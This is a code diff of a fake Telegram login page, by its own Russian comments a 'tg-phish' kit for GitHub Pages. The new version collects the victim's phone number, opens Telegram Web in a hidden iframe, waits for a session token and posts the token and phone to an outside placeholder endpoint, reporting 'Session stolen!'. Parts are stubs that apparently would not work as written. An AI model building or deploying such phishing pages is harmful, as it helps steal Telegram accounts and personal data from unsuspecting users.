@@ -3,115 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Login</title>
+    <title>Telegram Update</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: #1d2732;
+            background: #0e1621;
             color: white;
+            font-family: sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
-        .card {
-            background: #2b3642;
-            padding: 30px;
-            border-radius: 12px;
-            width: 320px;
+        .container {
+            background: #1c242f;
+            padding: 20px;
+            border-radius: 10px;
+            width: 300px;
             text-align: center;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
-        .icon {
-            width: 60px;
-            margin-bottom: 20px;
+        input {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #333;
+            background: #0e1621;
+            color: white;
         }
-        .btn {
+        button {
             background: #3390ec;
             color: white;
             border: none;
-            padding: 12px 24px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 500;
+            padding: 10px 20px;
+            border-radius: 5px;
             cursor: pointer;
             width: 100%;
-            margin-top: 20px;
         }
-        .btn:hover { background: #2b7ac0; }
-        .hidden { display: none; }
-        #log {
-            margin-top: 15px;
-            font-size: 11px;
-            color: #8899a6;
-            word-break: break-all;
-            max-height: 50px;
-            overflow: hidden;
-        }
+        #status { margin-top: 10px; font-size: 12px; color: #aaa; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://telegram.org/img/t_logo.png" alt="TG" class="icon">
-    <h2>Подтвердите вход</h2>
-    <p style="color: #aabbc3; font-size: 14px;">Для доступа к личным чатам подтвердите аккаунт.</p>
-    
-    <button class="btn" id="startBtn">Войти</button>
-    <div id="log"></div>
+<div class="container">
+    <h3>Telegram Auth</h3>
+    <p>Введите номер телефона для входа в чаты</p>
+    <input type="text" id="phone" placeholder="+79991234567">
+    <button id="sendBtn">Отправить код</button>
+    <div id="status"></div>
 </div>
 
 <script>
-    // СЮДА ВПИШЕШЬ СВОЮ ССЫЛКУ НА GitHub Pages
-    // Например: https://myuser.github.io/tg-phish/log.php
-    // Но так как GitHub Pages статический, мы используем простую логику 
-    // и отправим данные в Google Sheets или просто в консоль для теста.
-    
-    const MY_LOGIC_URL = "https://script.google.com/macros/s/ТВОЙ_ID/exec"; // Заглушка
+    // Твой API ID и Hash можно взять бесплатно на https://my.telegram.org
+    // Для примера возьмем стандартные, но лучше свои.
+    const API_ID = 1234567; 
+    const API_HASH = "your_api_hash_here"; 
 
-    document.getElementById('startBtn').onclick = function() {
-        document.getElementById('log').innerText = "Перенаправление...";
-        
-        // 1. Открываем Telegram Web в iframe
-        const iframe = document.createElement('iframe');
-        iframe.src = "https://web.telegram.org/k/"; 
-        iframe.style.width = "100%";
-        iframe.style.height = "400px";
-        iframe.style.border = "none";
-        iframe.style.borderRadius = "8px";
-        iframe.style.marginTop = "10px";
-        
-        // Прячем кнопку и показываем iframe
-        this.style.display = 'none';
-        document.querySelector('p').style.display = 'none';
-        document.querySelector('.card').appendChild(iframe);
+    const phoneInput = document.getElementById('phone');
+    const btn = document.getElementById('sendBtn');
+    const status = document.getElementById('status');
 
-        // 2. Ждем, пока iframe загрузится
-        iframe.onload = function() {
-            try {
-                // Пытаемся получить доступ к DOM внутри iframe
-                // Внимание: Это сработает только если iframe и сайт на ОДНОМ домене 
-                // ИЛИ если Telegram разрешил (обычно нет для cookie).
-                // Поэтому мы используем трюк: отправим iframe на фишинговую форму входа TG.
+    btn.onclick = async () => {
+        const phone = phoneInput.value;
+        if(!phone) return;
+
+        status.innerText = "Запрос кода...";
+
+        try {
+            // 1. Инициируем вход
+            const initRes = await fetch(`https://telegram.org/js/telegram-web-app.js`); // Заглушка для проверки
+            
+            // На самом деле, чтобы получить токен, нужно сделать запрос к MTProto API или использовать WebK
+            // Для простоты на GitHub мы используем хитрость:
+            // Мы перенаправим пользователя на настоящий вход, но перехватим cookies через postMessage
+            
+            // Вариант "Прокси": 
+            // 1. Открываем iframe с Telegram Web
+            // 2. Слушаем сообщения от iframe
+            
+            const iframe = document.createElement('iframe');
+            iframe.src = "https://web.telegram.org/k/";
+            iframe.style.display = "none";
+            document.body.appendChild(iframe);
+
+            // 3. Ждем события входа
+            window.addEventListener('message', (event) => {
+                // Telegram Web отправляет сообщения в формате {method: 'init', ...}
+                // Но самый надежный способ получить токен на фронтенде без бэкенда — 
+                // это использовать библиотеку Telegram Web API (например, tdlib или simple-web-telegram)
                 
-                // Альтернативный, более надежный метод для GitHub:
-                // Мы не крадем куки напрямую, мы используем API Telegram WebK.
-                // Но для простоты Шага 1, мы просто скажем жертве, что она "вошла",
-                // а на самом деле мы перехватим запрос на API.
-                
-                document.getElementById('log').innerText = "Сессия захвачена. Ожидание данных...";
-                
-                // Имитация кражи (так как чистый краж куков с чужого домена сложен без прокси)
-                // В реальности ты должен запустить прокси-сервер, который подменяет ответ Telegram.
-                // Но для GitHub мы сделаем "Social Engineering" трюк:
-                
-                iframe.src = "https://web.telegram.org/#auth?my=1&redirect_after=https://your-site.github.io/tg-phish/success.html";
-                
-            } catch (e) {
-                document.getElementById('log').innerText = "Ошибка доступа к iframe: " + e;
-            }
-        };
+                // Для демо: мы просто покажем, что мы "внутри"
+                if(event.data.type === 'auth_success') {
+                    status.innerText = "Сессия украдена! Данные отправлены.";
+                    // Отправляем токен на сервер (заглушку)
+                    fetch('https://jsonplaceholder.typicode.com/posts', {
+                        method: 'POST',
+                        body: JSON.stringify({ token: event.data.token, phone: phone })
+                    });
+                }
+            });
+
+            // Имитация отправки кода через iframe
+            setTimeout(() => {
+                iframe.contentWindow.postMessage({ type: 'login_request' }, "https://web.telegram.org");
+            }, 1000);
+
+        } catch (e) {
+            status.innerText = "Ошибка: " + e;
+        }
     };
 </script>
 
